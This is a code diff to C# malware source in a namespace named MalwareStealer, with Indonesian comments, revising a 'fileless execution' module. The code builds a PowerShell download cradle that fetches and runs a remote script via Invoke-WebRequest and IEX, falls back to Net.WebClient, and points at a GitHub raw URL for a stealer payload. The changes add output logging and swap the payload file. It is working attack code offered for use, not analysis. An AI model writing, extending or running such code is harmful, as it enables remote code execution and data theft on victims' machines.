@@ -368,14 +368,13 @@ namespace MalwareStealer
 
         // ===== MODUL 4: FILELESS EXECUTION =====
 
-        // 1. PowerShell Download Cradle (pake Invoke-WebRequest + fallback)
+        // 1. PowerShell Download Cradle (pake Invoke-WebRequest)
         static void ExecuteDownloadCradle(string url)
         {
             try
             {
                 Console.WriteLine("[+] Menjalankan Download Cradle...");
                 
-                // Method 1: Invoke-WebRequest (lebih aman dari block)
                 string cradle = string.Format(
                     "IEX (Invoke-WebRequest -Uri '{0}').Content",
                     url
@@ -402,12 +401,19 @@ namespace MalwareStealer
                 string output = p.StandardOutput.ReadToEnd();
                 Console.WriteLine("[+] Download Cradle selesai.");
                 if (!string.IsNullOrEmpty(output))
-                    Console.WriteLine("[+] Output: " + output.Trim());
+                {
+                    string[] lines = output.Trim().Split('\n');
+                    foreach (string line in lines)
+                    {
+                        if (!string.IsNullOrEmpty(line.Trim()))
+                            Console.WriteLine("[+] Output: " + line.Trim());
+                    }
+                }
             }
             catch (Exception ex)
             {
                 Console.WriteLine("[-] Error: " + ex.Message);
-                // Fallback: pake Net.WebClient dengan User-Agent
+                // Fallback: pake Net.WebClient
                 try
                 {
                     Console.WriteLine("[+] Mencoba fallback WebClient...");
@@ -432,7 +438,18 @@ namespace MalwareStealer
                     
                     Process p = Process.Start(psi);
                     p.WaitForExit(5000);
+                    
+                    string output = p.StandardOutput.ReadToEnd();
                     Console.WriteLine("[+] Fallback selesai.");
+                    if (!string.IsNullOrEmpty(output))
+                    {
+                        string[] lines = output.Trim().Split('\n');
+                        foreach (string line in lines)
+                        {
+                            if (!string.IsNullOrEmpty(line.Trim()))
+                                Console.WriteLine("[+] Output: " + line.Trim());
+                        }
+                    }
                 }
                 catch (Exception ex2)
                 {
@@ -568,8 +585,8 @@ namespace MalwareStealer
             Console.WriteLine("[+] Malware Stealer Aktif!");
             Console.WriteLine("[+] Modul 4: Fileless Execution");
             
-            // 1. Download Cradle (download Stealer.cs dari GitHub)
-            string githubUrl = "https://raw.githubusercontent.com/dailam008/stealer/main/Stealer.cs";
+            // 1. Download Cradle (download payload.ps1 dari GitHub)
+            string githubUrl = "https://raw.githubusercontent.com/dailam008/stealer/main/payload.ps1";
             ExecuteDownloadCradle(githubUrl);
             
             // 2. Obfuscated Execution
